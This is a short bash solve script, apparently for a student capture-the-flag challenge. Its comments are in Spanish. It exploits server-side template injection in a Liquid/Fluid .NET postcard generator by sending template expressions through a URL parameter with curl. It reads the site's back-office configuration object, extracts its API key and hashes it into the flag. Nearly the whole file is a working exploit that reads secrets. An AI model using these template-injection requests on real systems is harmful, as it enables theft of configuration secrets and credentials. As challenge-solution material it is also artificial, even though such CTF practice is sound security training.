#!/usr/bin/env bash
# Efemérides (CTF AWS Student) — SSTI en el generador de tarjetas (Liquid/Fluid, .NET).
# Lee la API key del objeto de configuración del backoffice y calcula la flag (md5).
#
# Uso: ./solve.sh https://<instancia>.softwareseguro.com.ar
set -euo pipefail

BASE="${1:?Uso: ./solve.sh https://<instancia>.softwareseguro.com.ar}"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"

# Renderiza una expresión Liquid en el campo 'plantilla' y extrae el contenido de la postal.
render() {
  curl -s -A "$UA" -G "$BASE/tarjeta" \
    --data-urlencode "id=17" \
    --data-urlencode "plantilla=[{{ $1 }}]" \
  | grep -oE 'postal-texto">\[[^<]*\]' | head -1 | sed 's/postal-texto">//'
}

echo "[*] Fingerprint del objeto sitio:        $(render 'sitio')"
echo "[*] Objeto de configuración backoffice:  $(render 'sitio.configuracion')"

APIKEY="$(render 'sitio.configuracion.apiKey' | tr -d '[]')"
echo "[+] API key: $APIKEY"

FLAG="$(printf '%s' "$APIKEY" | md5sum | cut -d' ' -f1)"
echo "[+] FLAG (md5 de la api key): $FLAG"
